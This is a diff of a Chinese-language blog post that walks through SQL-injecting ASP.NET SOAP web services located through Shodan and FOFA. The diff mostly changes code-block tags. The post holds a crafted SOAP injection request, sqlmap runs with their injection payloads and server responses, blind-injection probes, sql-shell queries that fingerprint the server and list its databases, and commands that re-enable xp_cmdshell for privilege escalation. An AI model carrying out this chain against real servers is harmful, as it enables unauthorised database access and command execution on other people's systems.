@@ -18,7 +18,7 @@ permalink: /blog/2020/wsdl/inject/
 # 目标确定
 在shodan、fofa上搜`asmx`，找到疑似存在wsdl注入的站，大概的是这样的：`http://vuln_ip:8081/WebService1.asmx?WSDL`，一般我们可以通过手工的方式去尝试注入，这样的站访问进去后是类似xml的文件，里面是各种与服务器交互的参数，比如登录页面的username、passwd参数，开发者们都已经配置好这些参数；
 如下，这是一个参数对应的xml标签：
-```javascript
+```xml
 <s:element name="HelloWorldResponse">
 <s:complexType>
 <s:sequence>
@@ -32,7 +32,7 @@ permalink: /blog/2020/wsdl/inject/
 
 ## wsdl注入
 我们手工的方式是构造一个SOAP对应的参数的post包发给asmx网页。post包如下：
-```javascript
+```xml
 <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="http://tempuri.org/">
      <SOAP-ENV:Header/>
      <SOAP-ENV:Body>
@@ -43,7 +43,7 @@ permalink: /blog/2020/wsdl/inject/
 </SOAP-ENV:Envelope>
 ```
 大致的一个构造思路就是这样的，然后观察服务器数据库的报错情况，我们可以直接把数据post包拿过来跑：
-```javascript
+```bash
 root@#:/home/tool/sqlmap-data/wsdl-inject# sqlmap -r net-test1.txt --batch
         ___
        __H__
@@ -72,7 +72,7 @@ back-end DBMS: Microsoft SQL Server 2008
 [*] shutting down at 11:04:24
 ```
 注入payload单独发出来，如下：
-```javascript
+```
 ---
 Parameter: SOAP #1* ((custom) POST)
     Type: error-based
@@ -98,7 +98,9 @@ Parameter: SOAP #1* ((custom) POST)
 </SOAP-ENV:Envelope>
 ---
 ```
+
 我们可以偷懒一下，直接payload拿过来看看反包有什么不一样的地方~看到差别了吗。
+
 ```bash
 Type: 报错注入（error-based）:
 HTTP/1.1 500 Internal Server Error
@@ -110,8 +112,10 @@ X-Powered-By: ASP.NET
 Content-Length: 459
 
 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><soap:Fault><faultcode>soap:Server</faultcode><faultstring>Server was unable to process request.---&gt;在将 varchar 值 'qpbzq1qzkxq' 转换成数据类型</faultstring><detail/></soap:Fault></soap:Body></soap:Envelope>
-=======================================================================================
-=======================================================================================
+
+#=======================================================================================
+#=======================================================================================
+
 Type: 联合查询（UNION query），输出的信息比较多，限于篇幅，放上一些数据：
 
 HTTP/1.1 200 OK
@@ -129,7 +133,7 @@ Content-Length: 20111
 ## 常规查询：
 当然在平常注入的过程中，不仅仅存在上述的注入，我们更多的是常见的盲注、联合查询或者是布尔盲注、时间盲注等等；我们这里举得例子同样存在，当然也是万能的awvs跑出来的：
 
-```javascript
+```
 Discovered by Blind SQL Injection
 URL encoded POST input ins was set to eizSls
 查看不同输入的符号对应的true、flase值，单数的%27输入进去我们可以看到是flase，双数输入进去则为true：
@@ -142,7 +146,7 @@ xgBDwt'''''' => OK
 eizSls''''''' => ERROR
 ```
 老方法，直接SQLMAP跑~
-```javascript
+```
 POST /WebService1.asmx/getcode HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
@@ -157,7 +161,7 @@ Connection: Keep-alive
 ins=eizSls
 ```
 跑出来也是一样的效果，当然是一样的注入点，都是getcode这个功能接口跑的数据：
-```javascript
+```
 POST parameter 'ins' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
 ---
@@ -174,7 +178,7 @@ Parameter: ins (POST)
 
 # 信息搜集
 康康user，发现是dbo。<a href="https://blog.csdn.net/u010678947/article/details/48289849">SQL SERVER中[dbo]的解释：</a>
-```javascript
+```console
 web server operating system: Windows 2008 R2 or 7
 web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NET
 back-end DBMS: Microsoft SQL Server 2008
@@ -184,7 +188,7 @@ sql-shell> user
 user:    'dbo'
 ```
 看一下服务器是否站库分离：
-```javascript
+```bash
 sql-shell> select @@servername;
 [11:17:21] [INFO] fetching SQL SELECT statement query output: 'select @@servername'
 select @@servername;:    'WIN-VO157IKGT24'
@@ -193,13 +197,13 @@ sql-shell> select host_name();
 select host_name();:    'WIN-VO157IKGT24'
 ```
 两个都是`WIN-VO157IKGT24`所以应该没有站库分离。看一下数据库版本号
-```javascript
+```bash
 sql-shell> Select @@version
 [11:17:34] [INFO] fetching SQL SELECT statement query output: 'Select @@version'
 Select @@version:    'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) \n\tApr  2 2010 15:48:46 \n\tCopyright (c) Microsoft Corporation\n\tStandard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)\n'
 ```
 
-```javascript
+```bash
 root@#:/home/tool/sqlmap-data/wsdl-inject# sqlmap -r net-test1.txt --batch --dbs
 ---
 [11:04:34] [INFO] the back-end DBMS is Microsoft SQL Server
@@ -222,8 +226,9 @@ available databases [7]:
 ```
 
 # 提权
-```javascript
+```
 dbcc addextendedproc ("sp_oacreate","odsole70.dll");
 dbcc addextendedproc ("xp_cmdshell","xplog70.dll");
 ```
+
 to be continued；
